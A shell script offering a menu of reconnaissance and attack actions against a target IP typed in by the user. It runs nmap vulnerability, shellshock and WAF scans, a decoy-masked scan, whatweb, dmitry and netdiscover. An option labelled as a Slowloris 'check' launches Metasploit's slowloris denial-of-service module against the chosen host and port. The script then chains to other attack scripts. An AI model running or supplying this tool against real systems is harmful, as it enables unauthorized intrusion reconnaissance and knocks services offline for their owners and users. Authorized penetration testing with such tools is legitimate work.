#!/bin/sh
#Info-gather script
#Code by DroPZsec
#

#COLORED_OUTPUT

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# MENU CODE

clear
    sleep 1.0
echo $green "Loading Vulnereable Scanning Menu..." $reset 
    sleep 1.0
clear
    sleep 0.25
echo $orange 
figlet -f small "Vulnereable Menu"
echo "" $reset 
echo "" 
echo ""
echo ""
echo "" 
echo $blue"1."$reset $orange")"$reset $green "WHO IS" $reset
    sleep 0.25 
echo $blue"2."$reset $orange")"$reset $green "Service/Version Port Scan" $reset
    sleep 0.25 
echo $blue"3."$reset $orange")"$reset $green "Reconnaisance" $reset
    sleep 0.25 
echo $blue"4."$reset $orange")"$reset $green "Shellshock-Check Script Scan" $reset
    sleep 0.25 
echo $blue"5."$reset $orange")"$reset $green "Vulnereable Script Scan" $reset
    sleep 0.25 
echo $blue"6."$reset $orange")"$reset $green "Firewall-Scan / WAF-detection" $reset
    sleep 0.25 
echo $blue"7."$reset $orange")"$reset $green "Traceroute" $reset
    sleep 0.25 
echo $blue"8."$reset $orange")"$reset $green "Netdiscover" $reset
    sleep 0.25 
echo $blue"9."$reset $orange")"$reset $green "Slowloris DOS Check Scan" $reset
    sleep 0.25 
echo $blue"10."$reset $orange")"$reset $green "EXIT" $reset
    sleep 0.25 

echo $green "Enter your choice:" $reset
    read answer;

if [ $answer = 1 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    whois $ip
    nmap -Pn $ip --script=whois-ip.nse --script-args whois.whodb=nofile
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 2 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -sV $ip -d 
    echo $green "Press ENTER to continue..."
        read enter;
fi
if [ $answer = 3 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo whatweb $ip
    sudo dmitry -i -e $ip
    nmap -sT -Pn $ip -D 10.0.0.1,10.0.0.2,10.0.0.4
    echo $green "Press ENTER to continue..." $reset
        read enter; 
fi 
if [ $answer = 4 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -sV -p80 $ip --script=http-shellshock -d 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 5 ]; then
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn $ip --script vuln -d 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 6 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -p80,443 $ip --script http-waf-detection -d 
    sudo wafw00f $ip 
    echo $green "Press Enter to continue..." $reset 
        read enter;
fi 
if [ $answer = 7 ]; then
    echo $green "Enter Target IP:" $reset
        read ip;
    traceroute $ip 
    echo $green "Traceroute via NMAP..." $reset 
    sudo nmap -Pn $ip --traceroute 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi
if [ $answer = 8 ]; then
    echo $green "Enter Target Interface (eth0, wlan0...):" $reset
        read ip;
    sudo netdiscover -i $ip -r 192.168.0.0/24
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 9 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset
        read port;
    sudo nmap -Pn $ip --script http-slowloris-check 
    msfconsole -q -x " use auxiliary/dos/http/slowloris; set rhost $ip; set rport $port; exploit; exit; " 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi  
if [ $answer = 10 ]; then 
    echo $green "OK, Youre Choice..."
        sleep 1.0
    clear
    echo $blue
    figlet -f small "Vulnereable hub"
        sleep 0.5 
    figlet -f small "coded by:"
    echo $reset $orange 
        sleep 1.0 
    figlet -f big "vDroPZz"
        sleep 1.0
    clear 
    echo $reset $blue  
    figlet -f small "Follow me on Github:"
    echo $reset $orange 
        sleep 0.5 
    figlet -f big "DroPZsec"
        sleep 1.5 
    clear 
    echo $reset 
    cd ..
    ./BashAttack.sh  
fi 
 ./vulners.sh 
/bin/sh